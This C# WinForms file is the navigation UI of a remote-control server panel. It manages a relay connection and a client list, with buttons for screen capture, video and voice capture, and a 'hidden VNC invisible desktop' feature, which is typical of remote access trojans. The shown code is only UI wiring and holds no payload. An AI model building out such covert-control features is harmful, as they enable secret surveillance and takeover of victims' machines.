using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void BuildTopNavigationUI()
        {
            this.menuStrip1.Visible = true;
            this.menuStrip1.BackColor = Color.FromArgb(245, 248, 252);
            this.toolStrip1.Visible = false;
            this.toolStrip2.Visible = false;

            topNavigationPanel = new Panel();
            topNavigationPanel.Name = "topNavigationPanel";
            topNavigationPanel.Dock = DockStyle.Top;
            topNavigationPanel.Height = 64;
            topNavigationPanel.BackColor = Color.FromArgb(30, 58, 95);
            topNavigationPanel.Padding = new Padding(16, 8, 16, 6);

            Label titleLabel = new Label();
            titleLabel.AutoSize = false;
            titleLabel.Text = APP_TITLE;
            titleLabel.Font = new Font("微软雅黑", 12F, FontStyle.Bold);
            titleLabel.ForeColor = Color.White;
            titleLabel.Location = new Point(16, 8);
            titleLabel.Size = new Size(190, 24);

            topRelayStatusLabel = new Label();
            topRelayStatusLabel.AutoSize = false;
            topRelayStatusLabel.TextAlign = ContentAlignment.MiddleCenter;
            topRelayStatusLabel.Font = new Font("微软雅黑", 9F, FontStyle.Bold);
            topRelayStatusLabel.Location = new Point(210, 9);
            topRelayStatusLabel.Size = new Size(120, 22);
            SetRelayStatus(false);

            FlowLayoutPanel actionPanel = new FlowLayoutPanel();
            actionPanel.AutoSize = false;
            actionPanel.Location = new Point(16, 34);
            actionPanel.Size = new Size(700, 28);
            actionPanel.BackColor = Color.Transparent;
            actionPanel.WrapContents = false;
            BuildTopNavButtons(actionPanel);

            topClientInfoLabel = new Label();
            topClientInfoLabel.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            topClientInfoLabel.TextAlign = ContentAlignment.MiddleRight;
            topClientInfoLabel.Font = new Font("微软雅黑", 9F);
            topClientInfoLabel.ForeColor = Color.FromArgb(230, 238, 248);
            topClientInfoLabel.Location = new Point(this.ClientSize.Width - 460, 36);
            topClientInfoLabel.Size = new Size(430, 24);
            topClientInfoLabel.Text = "当前连接：未选择    电脑名称：-";

            topNavigationPanel.Controls.Add(titleLabel);
            topNavigationPanel.Controls.Add(topRelayStatusLabel);
            topNavigationPanel.Controls.Add(actionPanel);
            topNavigationPanel.Controls.Add(topClientInfoLabel);
            topNavigationPanel.Resize += topNavigationPanel_Resize;
            this.Controls.Add(topNavigationPanel);
            this.Controls.SetChildIndex(topNavigationPanel, this.Controls.GetChildIndex(this.menuStrip1));
        }

        private void BuildTopNavButtons(FlowLayoutPanel actionPanel)
        {
            topRelayButton = CreateTopNavButton("连接Relay");
            topRelayButton.Click += (s, e) => toolStripButton4_Click(this.toolStripButton4, EventArgs.Empty);
            actionPanel.Controls.Add(topRelayButton);
            actionPanel.Controls.Add(CreateTopNavButton("抓取屏幕", (s, e) => toolStripButton3_Click(s, e)));
            actionPanel.Controls.Add(CreateTopNavButton("视频语音", (s, e) => toolStripButtonCaptureVideo_Click(s, e)));
            actionPanel.Controls.Add(CreateTopNavButton("HVNC隐形桌面", onMenuHVNC));
            actionPanel.Controls.Add(CreateTopNavButton("配置程序", (s, e) => toolStripButtonSettings_Click(s, e)));
            actionPanel.Controls.Add(CreateTopNavButton("更多功能", ShowClientFunctionMenu));
        }

        private Button CreateTopNavButton(string text)
        {
            return CreateTopNavButton(text, null);
        }

        private void ShowClientFunctionMenu(object sender, EventArgs e)
        {
            Button button = sender as Button;
            if (button == null || contextMenuStripClient == null)
                return;
            contextMenuStripClient.Show(button, new Point(0, button.Height));
        }

        private Button CreateTopNavButton(string text, EventHandler click)
        {
            Button button = new Button();
            button.Text = text;
            button.AutoSize = true;
            button.Height = 28;
            button.MinimumSize = new Size(78, 28);
            button.Margin = new Padding(0, 0, 8, 0);
            button.Padding = new Padding(8, 0, 8, 0);
            button.FlatStyle = FlatStyle.Flat;
            button.FlatAppearance.BorderSize = 0;
            button.BackColor = Color.FromArgb(52, 91, 138);
            button.ForeColor = Color.White;
            button.Font = new Font("微软雅黑", 9F);
            if (click != null)
                button.Click += click;
            return button;
        }

        private void topNavigationPanel_Resize(object sender, EventArgs e)
        {
            if (topClientInfoLabel == null || topNavigationPanel == null)
                return;
            topClientInfoLabel.Left = topNavigationPanel.Width - topClientInfoLabel.Width - 16;
        }

        private void SetRelayStatus(bool connected)
        {
            if (topRelayStatusLabel != null)
            {
                topRelayStatusLabel.Text = connected ? "Relay 已连接" : "Relay 未连接";
                topRelayStatusLabel.BackColor = connected ? Color.FromArgb(44, 160, 90) : Color.FromArgb(130, 135, 145);
                topRelayStatusLabel.ForeColor = Color.White;
            }
            if (topRelayButton != null)
            {
                topRelayButton.Text = connected ? "断开Relay" : "连接Relay";
            }
        }

        private void UpdateSelectedClientInfo(SocketSession session)
        {
            string socketId = session == null ? string.Empty : session.SocketId;
            string hostName = session == null ? string.Empty : session.HostName;
            this.toolStripTextBox1.Text = socketId;
            this.toolStripTextBox2.Text = hostName;
            if (topClientInfoLabel != null)
            {
                topClientInfoLabel.Text = session == null ?
                    "当前连接：未选择    电脑名称：-" :
                    "当前连接：" + socketId + "    电脑名称：" + (string.IsNullOrEmpty(hostName) ? "-" : hostName);
            }
        }

        private void AutoConnectRelay()
        {
            string relayIP = Settings.CurrentSettings.RelayServerIP;
            int relayPort = Settings.CurrentSettings.RelayServerPort;
            if (string.IsNullOrEmpty(relayIP))
            {
                doOutput("未配置Relay服务器地址，跳过自动连接");
                return;
            }

            try
            {
                RSCApplication.oRemoteControlServer.Start(relayIP, relayPort);
                this.Text = APP_TITLE;
                this.toolStripButton4.Checked = true;
                SetRelayStatus(true);
                doOutput("已自动连接中转服务器");
            }
            catch (Exception ex)
            {
                Logger.Debug("自动连接Relay服务器失败: " + ex);
                this.toolStripButton4.Checked = false;
                SetRelayStatus(false);
                doOutput("自动连接Relay服务器失败，请检查配置");
            }
        }

        private ContextMenuStrip contextMenuStripClient;

    }
}
